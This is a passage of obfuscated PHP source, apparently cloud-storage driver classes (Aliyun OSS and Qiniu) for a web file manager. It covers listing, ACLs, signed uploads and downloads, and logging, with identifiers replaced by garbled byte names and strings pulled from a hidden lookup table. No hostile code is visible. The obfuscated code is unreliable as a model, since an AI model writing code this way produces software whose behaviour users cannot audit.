$…Ñ£ôÄØ[$§¿ÏÎ•ô[233]] = $«Ïú¹÷˜[$§¿ÏÎ•ô[233]]; } return $…Ñ£ôÄØ; } public function listPath($Ç–«ôøã, $ÙÈ»÷š… = false) { $Î“ê«ï =& $_SERVER[™¸œØ®Ü]; $ÙåŞÄè = $this->fileList($Ç–«ôøã, $Î“ê«ï[8], !0); foreach ($ÙåŞÄè[$Î“ê«ï[85]] as $ÉÆ—ûÄ’ => $èó«è¡¾) { $ÙåŞÄè[$Î“ê«ï[85]][$ÉÆ—ûÄ’] = $this->folderInfo($èó«è¡¾, $ÙÈ»÷š…, $èó«è¡¾); } foreach ($ÙåŞÄè[$Î“ê«ï[86]] as $ÉÆ—ûÄ’ => $èó«è¡¾) { $ÙåŞÄè[$Î“ê«ï[86]][$ÉÆ—ûÄ’] = $this->fileInfo($èó«è¡¾[$Î“ê«ï[32]], $ÙÈ»÷š…, $èó«è¡¾); } return $ÙåŞÄè; } protected function infoChildren($‰‡­×Šá, &$ñ÷Óöá±) { $¢ıöĞ‘é =& $_SERVER[™¸œØ®Ü]; $şÔÈ¹½ = $this->fileList($‰‡­×Šá, $¢ıöĞ‘é[12], !0); $ñ÷Óöá±[$¢ıöĞ‘é[81]] += count($şÔÈ¹½[$¢ıöĞ‘é[85]]); $ñ÷Óöá±[$¢ıöĞ‘é[80]] += count($şÔÈ¹½[$¢ıöĞ‘é[86]]); foreach ($şÔÈ¹½[$¢ıöĞ‘é[86]] as $‡ƒ ™ãò) { if (!$‡ƒ ™ãò || !$‡ƒ ™ãò[$¢ıöĞ‘é[79]]) { continue; } $ñ÷Óöá±[$¢ıöĞ‘é[79]] += $‡ƒ ™ãò[$¢ıöĞ‘é[79]]; } } public function has($áÎÒõƒÆ, $äú“Š‚û = false, $‘çßåÏœ = true) { $÷ÈíİĞË =& $_SERVER[™¸œØ®Ü]; $áÎÒõƒÆ = trim($áÎÒõƒÆ, $÷ÈíİĞË[8]); $ÉçŒ¡öÕ = empty($áÎÒõƒÆ) && $áÎÒõƒÆ !== $÷ÈíİĞË[230] ? $÷ÈíİĞË[12] : $áÎÒõƒÆ . $÷ÈíİĞË[8]; $¼Ï“ùÍĞ = $÷ÈíİĞË[12]; $ø®Ğ¾± = 500; $¶¥¸äÕÊ = $óú‹ø² = 0; while (!0) { check_abort(); $½À¸’øÏ = array($÷ÈíİĞË[1496] => $÷ÈíİĞË[8], $÷ÈíİĞË[1497] => $ÉçŒ¡öÕ, $÷ÈíİĞË[1498] => $ø®Ğ¾±, $÷ÈíİĞË[1499] => $¼Ï“ùÍĞ); try { $Æâï‡¸Á = $this->client->listObjects($this->bucket, $½À¸’øÏ); } catch (OSS\Core\OssException $Å¶±¤³ñ) { $this->writeLog(__FUNCTION__ . $÷ÈíİĞË[214] . $Å¶±¤³ñ->getMessage()); break; } $¼Ï“ùÍĞ = $Æâï‡¸Á->getNextMarker(); $õ©––íÅ = $Æâï‡¸Á->getObjectList(); $¤èÙÕ¼Õ = $Æâï‡¸Á->getPrefixList(); if ($äú“Š‚û) { if (count($õ©––íÅ) > 1 || count($õ©––íÅ) == 1 && $õ©––íÅ[0]->getKey() != $ÉçŒ¡öÕ) { $¶¥¸äÕÊ += count($õ©––íÅ) - 1; } if (!empty($¤èÙÕ¼Õ)) { $óú‹ø² += count($¤èÙÕ¼Õ); } if ($¼Ï“ùÍĞ === $÷ÈíİĞË[12]) { break; } continue; } if ($‘çßåÏœ) { if (!empty($õ©––íÅ)) { if (count($õ©––íÅ) > 1 || $õ©––íÅ[0]->getKey() != $ÉçŒ¡öÕ) { return !0; } } } else { if (!empty($¤èÙÕ¼Õ)) { return !0; } } if ($¼Ï“ùÍĞ === $÷ÈíİĞË[12]) { break; } } if ($äú“Š‚û) { return array($÷ÈíİĞË[241] => $¶¥¸äÕÊ, $÷ÈíİĞË[242] => $óú‹ø²); } return !1; } public function listAll($ÊÜ²µÒ) { $»ÓºÖ÷å =& $_SERVER[™¸œØ®Ü]; $’›áéóÒ = $this->fileList($ÊÜ²µÒ, $»ÓºÖ÷å[12], !0); $ëĞ‘é¥´ = array_to_keyvalue($’›áéóÒ[$»ÓºÖ÷å[86]], $»ÓºÖ÷å[32]); foreach ($’›áéóÒ[$»ÓºÖ÷å[85]] as $öĞËŞ„÷) { if (is_string($öĞËŞ„÷)) { $ëĞ‘é¥´[$öĞËŞ„÷] = array($»ÓºÖ÷å[79] => 0); } } return $this->listAllFiles($ÊÜ²µÒ, $ëĞ‘é¥´); } public function canRead($¾‡ÍœÕ…) { $Ú—¯»·í =& $_SERVER[™¸œØ®Ü]; $Ÿ§´ó¿ = $this->pathAcl($¾‡ÍœÕ…); return $Ÿ§´ó¿ == $Ú—¯»·í[1506] || $Ÿ§´ó¿ == $Ú—¯»·í[626] ? !0 : !1; } public function canWrite($Ñùóˆ) { $›Ë„¥¡‡ = $this->pathAcl($Ñùóˆ); return $›Ë„¥¡‡ == $_SERVER[™¸œØ®Ü][626] ? !0 : !1; } public function pathAcl($ÅÀÛØ£¯) { $ûøşÉÕ® =& $_SERVER[™¸œØ®Ü]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‘ÙĞ¬ñ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÅÀÛØ£¯)); } catch (OSS\Core\OssException $ıõ‡÷Ò) { $this->writeLog(__FUNCTION__ . $ûøşÉÕ®[214] . $ıõ‡÷Ò->getMessage()); return !1; } $øƒÎ™É» = $‘ÙĞ¬ñ == $ûøşÉÕ®[37] ? $this->bucketAcl : $‘ÙĞ¬ñ; if ($øƒÎ™É» == $ûøşÉÕ®[1507]) { return $ûøşÉÕ®[1506]; } if ($øƒÎ™É» == $ûøşÉÕ®[1508]) { return $ûøşÉÕ®[626]; } return $øƒÎ™É»; } private function chmodPath($Î±¯œî, $ÚåôêŒ“ = '') { $»–»Î±˜ =& $_SERVER[™¸œØ®Ü]; $ˆ‡·ˆÓ— = empty($ÚåôêŒ“) ? $»–»Î±˜[1508] : $ÚåôêŒ“; $Åõ‰Ë = array($»–»Î±˜[37], $»–»Î±˜[231], $»–»Î±˜[1507], $»–»Î±˜[1508]); if (!in_array($ˆ‡·ˆÓ—, $Åõ‰Ë)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Î±¯œî), $ˆ‡·ˆÓ—); } catch (OSS\Core\OssException $¬É†µ‚Ö) { $this->writeLog(__FUNCTION__ . $»–»Î±˜[214] . $¬É†µ‚Ö->getMessage()); return !1; } return !0; } public function getContent($¸¬òßš) { return $this->fileSubstr($¸¬òßš, -1); } public function setContent($­ËÚå«Û, $™Òƒ®Î± = '') { $£ú×ô…¼ =& $_SERVER[™¸œØ®Ü]; try { $ŒÉøšâ = $this->trafficLimit($£ú×ô…¼[1509]); $¤óƒİÅË = $this->client->putObject($this->bucket, $this->pathEncode($­ËÚå«Û), $™Òƒ®Î±, $ŒÉøšâ); } catch (OSS\Core\OssException $¸©Ë–®ã) { $this->writeLog(__FUNCTION__ . $£ú×ô…¼[214] . $¸©Ë–®ã->getMessage()); return !1; } $·Æúğ³ã = array($£ú×ô…¼[1503] => trim($¤óƒİÅË[$£ú×ô…¼[1500]], $£ú×ô…¼[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($­ËÚå«Û))); $this->updateObjMeta($­ËÚå«Û, $·Æúğ³ã); return isset($¤óƒİÅË[$£ú×ô…¼[1510]][$£ú×ô…¼[296]]) ? !0 : !1; } private function updateObjMeta($àÒ¨ŸÉÖ, $ĞÁğÒ¥) { $àÒ¨ŸÉÖ = $this->pathEncode($àÒ¨ŸÉÖ); try { $ÓÉî§Àì = array(OSS\OssClient::OSS_HEADERS => $ĞÁğÒ¥); $this->client->copyObject($this->bucket, $àÒ¨ŸÉÖ, $this->bucket, $àÒ¨ŸÉÖ, $ÓÉî§Àì); } catch (OSS\Core\OssException $Å‹ÊÙ™¸) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $Å‹ÊÙ™¸->getMessage()); return !1; } return !0; } public function upload($‰œ×óÀ, $ë«Ğ€š , $Ü¿û¸–ê = false, $çÈ§çğ = REPEAT_REPLACE) { $ˆ·ªóƒ… =& $_SERVER[™¸œØ®Ü]; $ïÉİ¹ãˆ = trim($‰œ×óÀ, $ˆ·ªóƒ…[8]); $éÛÊã²¯ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ˆ·ªóƒ…[1503] => @md5_file($ë«Ğ€š )), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‰œ×óÀ))); $éÛÊã²¯ = $this->trafficLimit($ˆ·ªóƒ…[1509], $éÛÊã²¯); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ïÉİ¹ãˆ), $ë«Ğ€š , $éÛÊã²¯); } catch (OSS\Core\OssException $É³Å·ü) { $this->writeLog(__FUNCTION__ . $ˆ·ªóƒ…[214] . $É³Å·ü->getMessage()); return !1; } return $this->getPathOuter($‰œ×óÀ); } public function getHost() { $åé¢°×œ =& $_SERVER[™¸œØ®Ü]; $Öåçùßë = explode($åé¢°×œ[210], parent::getHost()); return $Öåçùßë[0] . $åé¢°×œ[210] . $this->bucket . $åé¢°×œ[10] . $Öåçùßë[1]; } public function uploadFormData($’İ„­‰«, $êë¥¯Í = 3600) { $•àõÂ ü =& $_SERVER[™¸œØ®Ü]; if (!($àş’şÚ‘ = $this->getHost())) { return !1; } $‡Şæ¯ä¦ = $êë¥¯Í; $¤ü¡•ŸÕ = date($•àõÂ ü[1511], time() + $‡Şæ¯ä¦); $È‰ùÅ = new DateTime($¤ü¡•ŸÕ); $“úÒ¸ö = $È‰ùÅ->format(DateTime::ISO8601); $òÛúğå = strpos($“úÒ¸ö, $•àõÂ ü[373]); $“úÒ¸ö = substr($“úÒ¸ö, 0, $òÛúğå) . $•àõÂ ü[1512]; $­óÈŠ­Ò = 1048576000 * 5; $šË´ûşõ = $this->pathFather($’İ„­‰«); $„®³ñŸ’ = array($•àõÂ ü[264] => $“úÒ¸ö, $•àõÂ ü[267] => array(array($•àõÂ ü[1513], 0, $­óÈŠ­Ò), array($•àõÂ ü[269], $•àõÂ ü[270], $šË´ûşõ))); $İ¹‘áø¨ = base64_encode(json_encode($„®³ñŸ’)); $õ²æµ„ = base64_encode(hash_hmac($•àõÂ ü[1431], $İ¹‘áø¨, $this->secret, !0)); $ÍÆöÑË¶ = array($•àõÂ ü[1514] => $this->accessKey, $•àõÂ ü[279] => $İ¹‘áø¨, $•àõÂ ü[272] => $•àõÂ ü[263], $•àõÂ ü[1515] => $õ²æµ„, $•àõÂ ü[208] => $àş’şÚ‘); $ÍÆöÑË¶ = $this->trafficLimit($•àõÂ ü[1509], $ÍÆöÑË¶, !0); return $ÍÆöÑË¶; } public function uploadMultiData($Ï£Û»¥, $¬öœ±Û• = 3600) { $Î“ãú¡ =& $_SERVER[™¸œØ®Ü]; if (!($Õ–Ÿ™êŸ = $this->getHost())) { return !1; } $õĞä†éÇ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ï£Û»¥)); return array($Î“ãú¡[283] => $õĞä†éÇ, $Î“ãú¡[208] => $Õ–Ÿ™êŸ . $Î“ãú¡[8] . $this->pathEncode($Ï£Û»¥), $Î“ãú¡[284] => gmdate($Î“ãú¡[1516]), $Î“ãú¡[97] => $Ï£Û»¥); } public function uploadMultiAuth($ûÁÀÔÑï, $İÃ‹»¦† = array()) { if (isset($İÃ‹»¦†[$_SERVER[™¸œØ®Ü][285]])) { return $this->uploadPartAuth($ûÁÀÔÑï, $İÃ‹»¦†); } return $this->uploadListAuth($ûÁÀÔÑï, $İÃ‹»¦†); } private function uploadPartAuth($èš¨¦âñ, $òîå”­› = array()) { $ø×û™‚ =& $_SERVER[™¸œØ®Ü]; $œ¨ºó… = $òîå”­›[$ø×û™‚[97]]; $Ó¨õğÏÁ = $this->_getUploadAuth($œ¨ºó…, $òîå”­›); $àÕ”©Û = array($ø×û™‚[288] => $Ó¨õğÏÁ[$ø×û™‚[288]], $ø×û™‚[284] => $Ó¨õğÏÁ[$ø×û™‚[284]]); if (isset($Ó¨õğÏÁ[$ø×û™‚[1517]])) { $àÕ”©Û[$ø×û™‚[1517]] = $Ó¨õğÏÁ[$ø×û™‚[1517]]; } return $àÕ”©Û; } private function uploadListAuth($è‡¦ËÈ, $ÈÏîø’ú = array()) { $Àâıèø‹ =& $_SERVER[™¸œØ®Ü]; $İØù‘ßË = $ÈÏîø’ú[$Àâıèø‹[97]]; $–ÍÑ¸´Ã = $ÈÏîø’ú[$Àâıèø‹[283]]; $†ó…Ñ­É = $this->client->listParts($this->bucket, $this->pathEncode($İØù‘ßË), $–ÍÑ¸´Ã); $¬Õ¦¬ò§ = $†ó…Ñ­É->getListPart(); $ªÁ—ÍİŠ = array(); foreach ($¬Õ¦¬ò§ as $ŸµÍíÌû) { $ªÁ—ÍİŠ[] = array($Àâıèø‹[299] => $ŸµÍíÌû->getPartNumber(), $Àâıèø‹[300] => trim($ŸµÍíÌû->getETag(), $Àâıèø‹[121])); } if (!$ªÁ—ÍİŠ) { return !1; } $ıºÖ¨Í‹ = $this->_getUploadAuth($İØù‘ßË, $ÈÏîø’ú); return array($Àâıèø‹[288] => $ıºÖ¨Í‹[$Àâıèø‹[288]], $Àâıèø‹[284] => $ıºÖ¨Í‹[$Àâıèø‹[284]], $Àâıèø‹[291] => $ªÁ—ÍİŠ); } private function _getUploadAuth($°¤„÷¥ï, $¨É½»ï¨) { $¡®îÔ„Ñ =& $_SERVER[™¸œØ®Ü]; $òË²Û´ú = gmdate($¡®îÔ„Ñ[1516]); $½¾Ÿ­›û = isset($¨É½»ï¨[$¡®îÔ„Ñ[285]]) ? $¡®îÔ„Ñ[255] : $¡®îÔ„Ñ[290]; $›µæàÍÇ = array_intersect_key($¨É½»ï¨, array_flip(array($¡®îÔ„Ñ[285], $¡®îÔ„Ñ[283]))); ksort($›µæàÍÇ); $¶ÆéÔşË = $›µæàÍÇ ? $¡®îÔ„Ñ[76] . http_build_query($›µæàÍÇ, null, $¡®îÔ„Ñ[286], PHP_QUERY_RFC3986) : $¡®îÔ„Ñ[12]; $©ãÉ«Ú  = array($½¾Ÿ­›û, $¡®îÔ„Ñ[12], $¡®îÔ„Ñ[123], $òË²Û´ú, "\170\x2d\x6f\x73\x73\55\x64\x61\x74\145\x3a{$òË²Û´ú}", $¡®îÔ„Ñ[8] . $this->bucket . $¡®îÔ„Ñ[8] . $°¤„÷¥ï . $¶ÆéÔşË); if (isset($¨É½»ï¨[$¡®îÔ„Ñ[285]])) { $ı‰ñÌù” = $this->trafficLimit($¡®îÔ„Ñ[1509], array(), !0); if ($ı‰ñÌù”) { $°¤„÷¥ï = $¡®îÔ„Ñ[1517]; array_splice($©ãÉ«Ú , 5, 0, $°¤„÷¥ï . $¡®îÔ„Ñ[4] . $ı‰ñÌù”[$°¤„÷¥ï]); } } $’×ÉÁâ… = implode($¡®îÔ„Ñ[287], $©ãÉ«Ú ); $¼Û¼şõÃ = base64_encode(hash_hmac($¡®îÔ„Ñ[1431], $’×ÉÁâ…, $this->secret, !0)); $¢¿…áŞÃ = $¡®îÔ„Ñ[1486] . $this->accessKey . $¡®îÔ„Ñ[4] . $¼Û¼şõÃ; $ØĞ¡ĞÎ§ = array($¡®îÔ„Ñ[288] => $¢¿…áŞÃ, $¡®îÔ„Ñ[284] => $òË²Û´ú); if (!empty($ı‰ñÌù”)) { $ØĞ¡ĞÎ§ = array_merge($ØĞ¡ĞÎ§, $ı‰ñÌù”); } return $ØĞ¡ĞÎ§; } public function download($Ê·»¸±›, $ÎİÌ‰÷Ú) { $¡ñöÈı¥ =& $_SERVER[™¸œØ®Ü]; if ($this->isFolder($Ê·»¸±›)) { return !1; } try { $üè¤µ· = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÎİÌ‰÷Ú); $üè¤µ· = $this->trafficLimit($¡ñöÈı¥[112], $üè¤µ·); $this->client->getObject($this->bucket, $this->pathEncode($Ê·»¸±›), $üè¤µ·); } catch (OSS\Core\OssException $¦ÌµŞÍ‹) { $this->writeLog(__FUNCTION__ . $¡ñöÈı¥[214] . $¦ÌµŞÍ‹->getMessage()); return !1; } return $ÎİÌ‰÷Ú; } public function fileSubstr($ÕÃÇåÔâ, $ìÍÊ„íò = 0, $´°¸ö©î = false) { if ($ìÍÊ„íò === -1) { $Š™˜½Ù¾ = array(); } else { if ($´°¸ö©î === !1) { $ˆ‡¦ìØÇ = $this->size($ÕÃÇåÔâ); } else { $ˆ‡¦ìØÇ = $ìÍÊ„íò + $´°¸ö©î - 1; } $Š™˜½Ù¾ = array(OSS\OssClient::OSS_RANGE => "{$ìÍÊ„íò}\x2d{$ˆ‡¦ìØÇ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÕÃÇåÔâ), $Š™˜½Ù¾); } catch (OSS\Core\OssException $ûŒµ–Şè) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $ûŒµ–Şè->getMessage()); think_exception($ûŒµ–Şè->getMessage()); return !1; } } private function trafficLimit($ÇÑ¼ı†, $­“û±ò© = array(), $Öšöè ª = false) { $šµ¥Ï€ü =& $_SERVER[™¸œØ®Ü]; if ($ÇÑ¼ı† == $šµ¥Ï€ü[1509] && $this->isUploadServer() || $ÇÑ¼ı† == $šµ¥Ï€ü[112] && $this->isFileOutServer()) { return $­“û±ò©; } $À–­İå¼ = floatval($GLOBALS[$šµ¥Ï€ü[6]][$šµ¥Ï€ü[92]][$šµ¥Ï€ü[110]][$ÇÑ¼ı†]) * 1024 * 1024 * 8; if (!$À–­İå¼) { return $­“û±ò©; } $À–­İå¼ = $À–­İå¼ < 819200 ? 819200 : ($À–­İå¼ > 838860800 ? 838860800 : $À–­İå¼); if ($Öšöè ª) { $­“û±ò©[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($À–­İå¼); } else { if (!isset($­“û±ò©[OSS\OssClient::OSS_HEADERS])) { $­“û±ò©[OSS\OssClient::OSS_HEADERS] = array(); } $­“û±ò©[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($À–­İå¼); } return $­“û±ò©; } public function link($™Å—úûİ, $µ©â÷ÅÇ = array()) { $Ø±áÓıØ =& $_SERVER[™¸œØ®Ü]; if (!$this->exist($™Å—úûİ) || $this->isFolder($™Å—úûİ)) { return !1; } try { $µ©â÷ÅÇ = $this->trafficLimit($Ø±áÓıØ[112], $µ©â÷ÅÇ, !0); $íÇÕİõß = $this->client->signUrl($this->bucket, $this->pathEncode($™Å—úûİ), 3600 * 12, $Ø±áÓıØ[1518], $µ©â÷ÅÇ); return $this->getCdnLink($íÇÕİõß); } catch (OSS\Core\OssException $‚ûÂ) { $this->writeLog(__FUNCTION__ . $Ø±áÓıØ[214] . $‚ûÂ->getMessage()); return !1; } } public function fileOut($èª²«ş’, $ºŸŞûËŒ = false, $—ÀÍÏáî = false, $÷®ÑºÔ = '') { $ıÎÊ´ =& $_SERVER[™¸œØ®Ü]; if ($this->isFileOutServer()) { return $this->fileOutServer($èª²«ş’, $ºŸŞûËŒ, $—ÀÍÏáî, $÷®ÑºÔ); } if (!$—ÀÍÏáî) { $—ÀÍÏáî = $this->pathThis($èª²«ş’); } $—ÀÍÏáî = rawurlencode($—ÀÍÏáî); $½ëØµ¤× = get_file_mime(get_path_ext($—ÀÍÏáî)); if ($½ëØµ¤× == $ıÎÊ´[250]) { return parent::fileOut($èª²«ş’, $ºŸŞûËŒ, $—ÀÍÏáî, $÷®ÑºÔ); } $ºŸŞûËŒ = $ºŸŞûËŒ ? $ıÎÊ´[1519] : $ıÎÊ´[1520]; $„“¾Àª— = array(OSS\OssClient::OSS_SUB_RESOURCE => $ıÎÊ´[1521] . rawurlencode("{$ºŸŞûËŒ}\73\x66\151\x6c\145\x6e\x61\155\145\x3d{$—ÀÍÏáî}")); $„“¾Àª—[OSS\OssClient::OSS_SUB_RESOURCE] .= $ıÎÊ´[1522] . rawurlencode($½ëØµ¤×); $ƒ‘Í›© = $this->link($èª²«ş’, $„“¾Àª—); $this->fileOutLink($ƒ‘Í›©); } public function fileOutServer($ÙããÑ, $Ü¼´°„Î = false, $Âï…Õ™æ = false, $Òì¤¯ = '') { parent::fileOut($ÙããÑ, $Ü¼´°„Î, $Âï…Õ™æ, $Òì¤¯); } public function fileOutImage($ÈÂÈÃø, $üÚÊ²ƒø = 250) { if ($this->size($ÈÂÈÃø) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÈÂÈÃø, $üÚÊ²ƒø); } $¦·è¢‚† = array(OSS\OssClient::OSS_PROCESS => $_SERVER[™¸œØ®Ü][1483] . $üÚÊ²ƒø); $—ëúÅš = $this->link($ÈÂÈÃø, $¦·è¢‚†); $this->fileOutLink($—ëúÅš); } public function fileOutImageServer($ë¯¿›…ê, $ ê°’õŞ = 250) { parent::fileOutImage($ë¯¿›…ê, $ ê°’õŞ); } public function fileOutLink($éÀ•éÁƒ) { $›Ñ™¿û‹ =& $_SERVER[™¸œØ®Ü]; if (!$this->isCdnHost() && substr($éÀ•éÁƒ, 0, 7) == $›Ñ™¿û‹[218]) { $éÀ•éÁƒ = $›Ñ™¿û‹[219] . substr($éÀ•éÁƒ, 7); } header($›Ñ™¿û‹[175] . $éÀ•éÁƒ); die; } public function hashMd5($¾‡°‹¡ã, $¨´”¬İ = '') { $Å¾¬Çı =& $_SERVER[™¸œØ®Ü]; $‡Ôëğ³† = $this->_objectMeta($¾‡°‹¡ã); if (!$‡Ôëğ³†) { return $Å¾¬Çı[12]; } if (!isset($‡Ôëğ³†[$Å¾¬Çı[1503]]) && !empty($¨´”¬İ)) { $¶í¼¹˜ = $this->updateObjMeta($¾‡°‹¡ã, array($Å¾¬Çı[1503] => $¨´”¬İ)); $‡Ôëğ³†[$Å¾¬Çı[1503]] = $¶í¼¹˜ ? $¨´”¬İ : $Å¾¬Çı[12]; } return isset($‡Ôëğ³†[$Å¾¬Çı[1503]]) ? strtolower($‡Ôëğ³†[$Å¾¬Çı[1503]]) : $Å¾¬Çı[12]; } public function size($ö¦‚äç–) { $”«·íœû = $this->objectMeta($ö¦‚äç–); return $”«·íœû ? $”«·íœû[$_SERVER[™¸œØ®Ü][79]] : 0; } public function info($£öôè¥ª) { if ($this->isFolder($£öôè¥ª)) { return $this->folderInfo($£öôè¥ª); } else { if ($this->isFile($£öôè¥ª)) { return $this->fileInfo($£öôè¥ª); } } return !1; } public function exist($Õ¶ÛäÇé) { return $this->isFile($Õ¶ÛäÇé) || $this->isFolder($Õ¶ÛäÇé); } public function isFile($„ïŒå‡â) { return !$this->isFolder($„ïŒå‡â) && $this->objectMeta($„ïŒå‡â); } public function isFolder($’îÚ¾®Í) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][179], $’îÚ¾®Í); } protected function objectMeta($÷àï¯„î) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][181], $÷àï¯„î); } protected function _objectMeta($”İ‹Ñæ) { $é€¸ˆ® =& $_SERVER[™¸œØ®Ü]; try { $¡ûøßßÏ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($”İ‹Ñæ)); } catch (OSS\Core\OssException $”Í áª) { $this->writeLog(__FUNCTION__ . $é€¸ˆ®[214] . $”Í áª->getMessage()); $¡ûøßßÏ = !1; } if ($¡ûøßßÏ) { $¡ûøßßÏ[$é€¸ˆ®[79]] = intval($¡ûøßßÏ[$é€¸ˆ®[1501]]); } return $¡ûøßßÏ; } protected function _isFolder($ííê³ó—) { $®“íõÍ =& $_SERVER[™¸œØ®Ü]; if ($ííê³ó— == $®“íõÍ[12] || $ííê³ó— == $®“íõÍ[8]) { return !0; } $Ğ‡éØğ³ = array($®“íõÍ[1496] => $®“íõÍ[8], $®“íõÍ[1497] => rtrim($ííê³ó—, $®“íõÍ[8]) . $®“íõÍ[8], $®“íõÍ[1498] => 1, $®“íõÍ[1499] => $®“íõÍ[12]); $ˆ‹È» µ = $this->client->listObjects($this->bucket, $Ğ‡éØğ³); if ($ˆ‹È» µ->getObjectList() || $ˆ‹È» µ->getPrefixList()) { return !0; } return !1; } public function writeLog($µò‘†şğ = '', $ÍâÑ—· = false) { $æÊÛêæª =& $_SERVER[™¸œØ®Ü]; $Ç™§ÄŠ = in_array(ACTION, array($æÊÛêæª[212], $æÊÛêæª[213])); if (!$Ç™§ÄŠ && !GLOBAL_DEBUG) { return; } $Î™é‘½ = 0; if (stripos($µò‘†şğ, $æÊÛêæª[1523]) !== !1) { $Î™é‘½ = 1; $øÇçİë¼ = explode($æÊÛêæª[1524], $µò‘†şğ); $µò‘†şğ = !empty($øÇçİë¼[1]) ? $øÇçİë¼[1] : $µò‘†şğ; } else { if (stripos($µò‘†şğ, $æÊÛêæª[1525])) { $Î™é‘½ = 2; $øÇçİë¼ = explode($æÊÛêæª[1525], $µò‘†şğ); $øÇçİë¼ = explode($æÊÛêæª[4], $øÇçİë¼[0]); $µò‘†şğ = !empty($øÇçİë¼[1]) ? $øÇçİë¼[1] : $µò‘†şğ; } } if ($Ç™§ÄŠ && I18n::getType() == $æÊÛêæª[1526]) { if ($Î™é‘½ == 1) { $µò‘†şğ = str_replace($æÊÛêæª[1527], $æÊÛêæª[1528], $µò‘†şğ); } else { if ($Î™é‘½ == 2) { $øÇçİë¼ = explode($æÊÛêæª[214], $øÇçİë¼[0]); $ñšˆ³™ = isset($øÇçİë¼[1]) ? $øÇçİë¼[1] : $æÊÛêæª[12]; $ÓÖ”‚ƒ = array($æÊÛêæª[1529] => $æÊÛêæª[1530], $æÊÛêæª[1531] => $æÊÛêæª[1532], $æÊÛêæª[1533] => $æÊÛêæª[1534], $æÊÛêæª[1535] => $æÊÛêæª[1536], $æÊÛêæª[1537] => $æÊÛêæª[1538], $æÊÛêæª[1539] => $æÊÛêæª[1540], $æÊÛêæª[1541] => $æÊÛêæª[1542], $æÊÛêæª[1543] => $æÊÛêæª[1544], $æÊÛêæª[1545] => $æÊÛêæª[1546], $æÊÛêæª[1547] => $æÊÛêæª[1548]); if (isset($ÓÖ”‚ƒ[$ñšˆ³™])) { $µò‘†şğ = $ÓÖ”‚ƒ[$ñšˆ³™]; } } } if (stripos($µò‘†şğ, $æÊÛêæª[1549])) { $µò‘†şğ = $æÊÛêæª[1550]; } } if (!trim($µò‘†şğ)) { return; } parent::writeLog(trim($µò‘†şğ), $ÍâÑ—·); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($³àğğõá) { parent::__construct(); require_once SDK_DIR . $_SERVER[™¸œØ®Ü][1551]; $this->_init($³àğğõá); } public function _init($ùÆı÷®º) { $¢Ìô×çõ =& $_SERVER[™¸œØ®Ü]; $this->config = $ùÆı÷®º; foreach ($ùÆı÷®º as $‘â¶€½ => $Šı¼ıüÎ) { if (isset($this->{$‘â¶€½})) { $this->{$‘â¶€½} = $Šı¼ıüÎ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¢Ìô×çõ[1552] . LNG($¢Ìô×çõ[1487])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($à˜»à¤Ş, $øúÜ¨”ğ = '', $Ò’¿¯˜ú = REPEAT_RENAME) { if ($this->setContent($à˜»à¤Ş, $øúÜ¨”ğ)) { return $this->getPathOuter($à˜»à¤Ş); } return !1; } public function mkdir($˜‚ïïé·, $ÎúÀùÙ‚ = REPEAT_SKIP) { $Šßö„íß =& $_SERVER[™¸œØ®Ü]; $”ûôéÎÊ = trim($˜‚ïïé·, $Šßö„íß[8]); if ($this->_isFolder($”ûôéÎÊ)) { return $this->getPathOuter($”ûôéÎÊ); } $˜‚ïïé· = $”ûôéÎÊ . $Šßö„íß[8]; $ÕûÓˆ˜ = get_path_this($”ûôéÎÊ); $ÌÀİ»€ = $˜‚ïïé· . $ÕûÓˆ˜; if (!$this->mkfile($ÌÀİ»€)) { return !1; } if (!$this->moveFile($ÌÀİ»€, $˜‚ïïé·)) { $this->delFile($ÌÀİ»€); return !1; } return $this->getPathOuter($”ûôéÎÊ); } public function copyFile($ìŞ´úû, $½¶æºœ) { $’áÀş• = $this->bucketManager->copy($this->bucket, $ìŞ´úû, $this->bucket, $½¶æºœ, !0); return $’áÀş• ? !1 : $this->getPathOuter($½¶æºœ); } public function moveFile($ßûç¤ÑÚ, $Ò×†ğ»ç) { $ıÀş™ôÎ = $this->bucketManager->move($this->bucket, $ßûç¤ÑÚ, $this->bucket, $Ò×†ğ»ç, !0); return $ıÀş™ôÎ ? !1 : $this->getPathOuter($Ò×†ğ»ç); } public function delFile($Ÿù¼Û‰Ö) { if (!$this->exist($Ÿù¼Û‰Ö)) { return !0; } $ï•Şšøõ = $this->bucketManager->delete($this->bucket, $Ÿù¼Û‰Ö); if (!$ï•Şšøõ) { return !0; } return $ï•Şšøõ->code() == 612 ? !0 : !1; } public function delFolder($”åêË»ò) { $ß‰³«ë÷ =& $_SERVER[™¸œØ®Ü]; if (!$this->exist($”åêË»ò)) { return !0; } $this->listItemCache = 